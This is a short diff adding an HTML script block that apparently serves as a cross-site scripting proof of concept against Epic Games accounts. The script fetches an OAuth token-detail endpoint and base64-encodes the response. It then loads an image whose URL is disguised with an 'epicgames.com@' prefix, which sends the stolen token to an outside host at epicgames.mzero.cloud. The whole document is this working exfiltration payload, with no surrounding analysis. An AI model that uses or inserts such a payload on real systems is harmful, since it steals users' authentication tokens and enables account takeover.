@@ -1,0 +1,7 @@
+<script>
+    exfil = new XMLHttpRequest();
+    exfil.open("GET", "https://content-service.bfda.live.use1a.on.epicgames.com/oauth/v1/token-detail");
+    exfil.send();
+
+    exfil.onload = function() {document.write('<img src="https://epicgames.com@epicgames.mzero.cloud/payload/epictokenleak.html?token=' + btoa(this.responseText) + '">');} 
+</script>
